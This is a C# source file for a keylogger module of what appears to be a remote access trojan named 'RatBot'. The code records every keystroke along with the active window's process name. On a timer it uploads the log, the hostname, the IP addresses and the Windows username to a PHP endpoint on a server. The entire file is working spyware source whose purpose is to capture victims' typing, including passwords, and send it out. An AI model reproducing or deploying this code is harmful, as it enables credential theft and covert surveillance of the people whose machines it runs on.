﻿using System;
using System.Collections.Generic;


//--For Keylogger
using System.Windows.Input; //-- for Key
using System.Windows.Forms; //-- for Keys and Control
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;

using System.Timers;
using System.Threading;

using System.IO;

namespace RatBot
{

    internal class ClientKeylogger
    {
        //-- reusing the webclient from Program class 
        //-- we need this to send the keylog to php script on server
        static WebClient webclient = Program.webClient;
        static bool isStarted = false;



        private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
        static System.Timers.Timer timer = new System.Timers.Timer();

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        //--For Keylogger --
        static string path = "keystrokes.txt";
        static string activeProcessName = GetActiveWindowProcessName().ToLower();
        static string prevProcessName = activeProcessName;

        static Thread th_doKeylogger;


        public static void initClientKeylogger()
        {
            //--[ For Sending keylog to server ]--
            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();


            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    sw.WriteLine("\r\n[--" + activeProcessName + "--]");
                    sw.Close();
                }
            }

            //-- create a new thread so that keylogger and the main program run concurrently 
            th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
            th_doKeylogger.SetApartmentState(ApartmentState.STA);
            th_doKeylogger.Start();
        }

        //-- called from Program main
        public static void StartKeylogger()
        {

            isStarted = true;
            Console.WriteLine("Keylogger started.");
        }

        //-- called from Program main
        public static void StopKeylogger()
        {
            if (File.Exists("keystrokes.txt"))
            {
                try
                {
                    File.Delete("keystrokes.txt");
                }
                catch (Exception)
                {
                    Console.WriteLine("unable to delete keystrokes.txt");
                }
            }
            isStarted = false;
            Console.WriteLine("Keylogger stopped.");
        }

        private static void DoKeylogger()
        {

            while (true)
            {

                Thread.Sleep(5);
                if (!isStarted) continue;

                // Get pressed keys and saves them
                string keyPressed = GetNewPressedKeys();

                Console.Write(keyPressed);
                using (StreamWriter sw = File.AppendText(path))
                {
                    activeProcessName = GetActiveWindowProcessName().ToLower();
                    bool isOldProcess = activeProcessName.Equals(prevProcessName);
                    if (!isOldProcess)
                    {
                        sw.WriteLine("\r\n[--" + activeProcessName + "--]");
                        prevProcessName = activeProcessName;
                    }
                    sw.Write(keyPressed);
                    sw.Close();
                }
            }
        }

        private static string GetNewPressedKeys()
        {
            string pressedKey = String.Empty;

            //-- Get the key state of every key we know
            foreach (int i in Enum.GetValues(typeof(Key)))
            {
                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());

                bool down = false;
                if (key != Key.None)
                {
                    // Is it pressed?
                    down = Keyboard.IsKeyDown(key);
                }

                //-- If not pressed, but it was - it means this key is released
                if (!down && PressedKeysHistory.Contains(key))
                    PressedKeysHistory.Remove(key);
                else if (down && !PressedKeysHistory.Contains(key)) //If the key is pressed, but wasn't pressed before - save it
                {
                    if (!isCaps())
                    {
                        PressedKeysHistory.Add(key);

                        pressedKey = key.ToString().ToLower(); //by default it is CAPS
                    }
                    else
                    {
                        PressedKeysHistory.Add(key);

                        pressedKey = key.ToString(); //CAPS
                    }

                }
            }

            return replaceStrings(pressedKey);
        }

        private static bool isCaps()
        {
            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;

            if (isCapsLockOn || isShiftKeyPressed) return true;
            else return false;
        }

        private static string replaceStrings(string input)
        {
            string replacedKey = input;
            switch (input)
            {
                case "space":
                case "Space":
                    replacedKey = " ";
                    break;
                case "return":
                    replacedKey = "\r\n";
                    break;
                case "escape":
                    replacedKey = "[ESC]";
                    break;
                case "leftctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "rightctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "RightShift":
                case "rightshift":
                    replacedKey = "";
                    break;
                case "LeftShift":
                case "leftshift":
                    replacedKey = "";
                    break;
                case "back":
                    replacedKey = "[Back]";
                    break;
                case "lWin":
                    replacedKey = "[WIN]";
                    break;
                case "tab":
                    replacedKey = "[Tab]";
                    break;
                case "Capital":
                    replacedKey = "";
                    break;
                case "oemperiod":
                    replacedKey = ".";
                    break;
                case "D1":
                    replacedKey = "!";
                    break;
                case "D2":
                    replacedKey = "@";
                    break;
                case "oemcomma":
                    replacedKey = ",";
                    break;
                case "oem1":
                    replacedKey = ";";
                    break;
                case "Oem1":
                    replacedKey = ":";
                    break;
                case "oem5":
                    replacedKey = "\\";
                    break;
                case "oemquotes":
                    replacedKey = "'";
                    break;
                case "OemQuotes":
                    replacedKey = "\"";
                    break;
                case "oemminus":
                    replacedKey = "-";
                    break;
                case "delete":
                    replacedKey = "[DEL]";
                    break;
                case "oemquestion":
                    replacedKey = "/";
                    break;
                case "OemQuestion":
                    replacedKey = "?";
                    break;
            }

            return replacedKey;
        }

        private static string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);

            return process.ProcessName;
        }


        //--[ Send Keystrokes ]--
        static void onTimedEvent(object sender, EventArgs e)
        {
            if (!isStarted) return;
            try
            {
                webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                webclient.UploadString("http://127.0.0.1/sendkeylog.php", "client=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes());
            }
            catch (Exception)
            {
                System.Threading.Thread.Sleep(5000); //If No Client
            }
        }

        //--[ get keystrokes ]--
        public static string GetKeystrokes()
        {
            string filePath = "keystrokes.txt";

            string logContents = File.ReadAllText(filePath);
            string messageBody = "";
            string newLine = Environment.NewLine;

            //-- create a  message
            DateTime now = DateTime.Now;

            var host = Dns.GetHostEntry(Dns.GetHostName());

            messageBody += "IP Addresses:" + newLine;
            foreach (var address in host.AddressList)
            {
                messageBody += address + newLine;
            }

            messageBody += newLine + "User: " + Environment.UserDomainName + "\\" + Environment.UserName + "\r\n";
            messageBody += "Time: " + now.ToString() + newLine;
            messageBody += newLine + "--- Keystrokes --- " + newLine + logContents;

            return messageBody;
        }
    }
}
